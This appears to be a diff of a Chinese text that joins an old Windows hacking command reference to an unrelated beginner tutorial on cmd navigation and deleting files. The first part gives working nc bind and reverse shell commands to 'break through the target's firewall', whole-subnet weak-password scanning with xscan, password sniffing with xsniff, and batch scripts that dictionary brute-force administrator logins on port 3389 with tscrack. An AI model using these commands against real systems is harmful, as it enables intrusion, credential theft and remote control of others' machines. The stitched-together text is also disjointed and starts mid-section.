+例："if "%2%"=="4" goto start"指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" "）
+IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。
+例："if not nc.exe goto end"指：如果没有发现nc.exe文件就跳到":end"标签处。
+
+IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。
+当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如："if exist test.txt. else echo test.txt.missing "，注意命令中的"."
+
+（二）系统外部命令(均需下载相关工具)：
+1、瑞士军刀：nc.exe
+参数说明：
+-h 查看帮助信息
+-d 后台模式
+-e prog程序重定向，一但连接就执行［危险］
+-i secs延时的间隔
+-l 监听模式，用于入站连接
+-L 监听模式，连接天闭后仍然继续监听，直到CTR+C
+-n IP地址，不能用域名
+-o film记录16进制的传输
+-p[空格]端口 本地端口号
+-r 随机本地及远程端口
+-t 使用Telnet交互方式
+-u UDP模式
+-v 详细输出，用-vv将更详细
+-w数字 timeout延时间隔
+-z 将输入，输出关掉（用于扫锚时）
+基本用法：
+nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口
+nc -l -p 80 开启本机的TCP 80端口并监听
+nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口
+nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口
+nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口
+高级用法：
+nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止
+nc -L -p 80 > c:\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt
+nc -L -p 80 < c:\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用
+type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用
+本机上用：nc -l -p 本机端口
+在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K
+nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙
+本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称
+在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机
+备 注：
+| 管道命令
+< 或 > 重定向命令。"<"，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令
+＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\winnt >> d:\log.txt 意思是：后台执行dir，并把结果存在d:\log.txt中
+>与>>的区别 　">"指：覆盖；">>"指：保存到(添加到）。
+如：@dir c:\winnt >> d:\log.txt和@dir c:\winnt > d:\log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。
+#8 八：
+2、扫锚工具：xscan.exe
+基本格式
+xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息
+xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息
+检测项目
+-active 检测主机是否存活
+-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）
+-port 检测常用服务的端口状态
+-ftp 检测FTP弱口令
+-pub 检测FTP服务匿名用户写权限
+-pop3 检测POP3-Server弱口令
+-smtp 检测SMTP-Server漏洞
+-sql 检测SQL-Server弱口令
+-smb 检测NT-Server弱口令
+-iis 检测IIS编码/解码漏洞
+-cgi 检测CGI漏洞
+-nasl 加载Nessus攻击脚本
+-all 检测以上所有项目
+其它选项
+-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取
+-l 显示所有网络适配器
+-v 显示详细扫描进度
+-p 跳过没有响应的主机
+-o 跳过没有检测到开放端口的主机
+　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10
+-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)
+用法示例
+xscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机
+xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机
+xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测"hostlist.txt"文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机
+3、命令行方式嗅探器: xsniff.exe
+可捕获局域网内FTP/SMTP/POP3/HTTP协议密码
+参数说明
+-tcp 输出TCP数据报
+-udp 输出UDP数据报
+-icmp 输出ICMP数据报
+-pass 过滤密码信息
+-hide 后台运行
+-host 解析主机名
+-addr IP地址 过滤IP地址
+-port 端口 过滤端口
+-log 文件名 将输出保存到文件
+-asc 以ASCII形式输出
+-hex 以16进制形式输出
+用法示例
+xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中
+xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出
+4、终端服务密码破解: tscrack.exe
+参数说明
+-h 显示使用帮助
+-v 显示版本信息
+-s 在屏幕上打出解密能力
+-b 密码错误时发出的声音
+-t 同是发出多个连接（多线程）
+-N Prevent System Log entries on targeted server
+-U 卸载移除tscrack组件
+-f 使用－f后面的密码
+-F 间隔时间（频率）
+-l 使用－l后面的用户名
+-w 使用－w后面的密码字典
+-p 使用－p后面的密码
+-D 登录主页面
+用法示例
+tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码
+tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户
+@if not exist ipcscan.txt goto noscan
+@for /f "tokens=1 delims= " %%i in (3389.txt) do call hack.bat %%i
+nscan
+@echo 3389.txt no find or scan faild
+(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)
+3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat
+@if not exist tscrack.exe goto noscan
+@tscrack %1 -l administrator -w pass.dic >>rouji.txt
+:noscan
+@echo tscrack.exe no find or scan faild
+(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)
+hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。
+5、其它：
+Shutdown.exe
+Shutdown \\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）
+fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）
+fpipe -l 80 -s 1029 -r 80 www.sina.com.cn 当有人扫锚你的80端口时，他扫到的结果会完全是www.sina.com.cn的主机信息
+Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。
+OpenTelnet.exe (远程开启telnet工具)
+opentelnet.exe \\IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\ip 连接上对方。
+NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。
+ResumeTelnet.exe (OpenTelnet附带的另一个工具)
+resumetelnet.exe \\IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。
+6、FTP命令详解：
+FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。
+FTP的命令行格式为：
+ftp -v -d -i -n -g [主机名] ，其中
+-v 显示远程服务器的所有响应信息；
+-n 限制ftp的自动登录，即不使用；.n etrc文件；
+-d 使用调试方式；
+-g 取消全局文件名。
+
+FTP使用的内部命令如下(中括号表示可选项):
+1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip
+2.$ macro-ame[args]： 执行宏定义macro-name。
+3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。
+4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。
+5.ascii：使用ascii类型传输方式。
+6.bell：每个命令执行完毕后计算机响铃一次。
+7.bin：使用二进制文件传输方式。
+8.bye：退出ftp会话过程。
+9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。
+10.cd remote-dir：进入远程主机目录。
+11.cdup：进入远程主机目录的父目录。
+12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。
+13.close：中断与远程服务器的ftp会话(与open对应)。
+14.cr：使用asscii方式传输文件时，将回车换行转换为回行。
+15.delete remote-file：删除远程主机文件。
+16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。
+17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。
+18.disconnection：同close。
+19.form format：将文件传输方式设置为format，缺省为file方式。
+20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。
+21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。
+22.hash：每传输1024字节，显示一个hash符号(#)。
+23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。
+25.image：设置二进制传输方式(同binary)。
+26.lcd[dir]：将本地工作目录切换至dir。
+27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。
+28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。
+29.mdelete[remote-file]：删除远程主机文件。
+30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。
+31.mget remote-files：传输多个远程文件。
+32.mkdir dir-name：在远程主机中建一目录。
+33.mls remote-file local-file：同nlist，但可指定多个文件名。
+34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。
+35.modtime file-name：显示远程主机文件的最后修改时间。
+36.mput local-file：将多个文件传输至远程主机。
+37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。
+38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。
+39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。
+40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。
+41.open host[port]：建立指定ftp服务器连接，可指定连接端口。
+42.passive：进入被动传输方式。
+43.prompt：设置多个文件传输时的交互提示。
+44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。
+45.put local-file[remote-file]：将本地文件local-file传送至远程主机。
+46.pwd：显示远程主机的当前工作目录。
+47.quit：同bye，退出ftp会话。
+48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.
+49.recv remote-file[local-file]：同get。
+50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。
+51.rhelp[cmd-name]：请求获得远程主机的帮助。
+52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。
+53.rename[from][to]：更改远程主机文件名。
+54.reset：清除回答队列。
+55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。
+56.rmdir dir-name：删除远程主机目录。
+57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。
+58.send local-file[remote-file]：同put。
+59.sendport：设置PORT命令的使用。
+site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。
+size file-name：显示远程主机文件大小，如：site idle 7200。
+status：显示当前ftp状态。
+struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。
+sunique：将远程主机文件名存储设置为只一(与runique对应)。
+system：显示远程主机的操作系统类型。
+tenex：将文件传输类型设置为TENEX机的所需的类型。
+tick：设置传输时的字节计数器。
+trace：设置包跟踪。
+type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。
+umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3
+user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。
+verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.
+?[cmd]：同help.
+
+本文是我在平时的工作中，用到的一些常用的windows操作指令。有感于网上的资料良莠不齐，为了节省大家的查询成本，方便自己的工作，所以记录下来。在正式列举之前，有一个非常重要的操作需要提示一下。那就是在指定的文件夹下打开windows命令行窗口。
+
+将鼠标移到相应的文件夹上面，按住shift键，然后点击鼠标右键，然后点击“在此处打开命令行窗口”就可以进入相应的文件夹命令行窗口了。
+
+
+1、切换目录
+---windows命令行操作指令
+1、从C盘切换到E盘或者D盘
+
+输入“E：”敲回车键即可。
+
+
+2、打开E盘下的某个文件夹
+
+输入”cd test“即可打开E盘下的test文件夹
+
+
+注意看上图的第二行，显示”E：\test>”，这说明你现在位于test文件夹内。
+
+输入“cd ..”即可退回到上一级目录。
+
+输入“cd / ”即可回到根目录下
+
+2、查看当前目录下有哪些文件夹和文件
+---windows命令行操作指令
+输入“dir”命令即可。
+
+
+3、新建文件夹，文件
+---windows命令行操作指令
+mkdir  文件夹名\子文件夹
+
+举例说明：在D盘下的myfiles文件内新建一个app的文件夹，你可以找到myfiles文件夹，按住shift键，然后右击文件夹，点击在此处打开命令行窗口，进入这个文件夹的命令行界面，然后输入mkdir app就行了。
+
+注意：注意分隔符是\，而不是/
+
+4、删除文件夹，文件
+---windows命令行操作指令
+有时候你想删除某个文件或者文件夹，但是提示你，需要管理员权限时怎么办呢？这个时候，使用下面的命令行指定，就可以轻松删除这些文件或者文件夹。
+
+rd E:\test
+
+rd是删除空文件夹的命令，如果要删除的文件夹内还有子文件夹或者子文件，那么会提示你“目录不是空的”。
+
+
+rd /s E:\test
+
+"re /s"是删除非空文件夹的命令。输入次命令后，会有确认提示。
+
+
+rd /s /q E:/test
+
+"rd /s /q"命令输入以后，不会出现确认提示。
+
+del E:\test\test2.txt
+
+del是删除文件的命令。
+
+
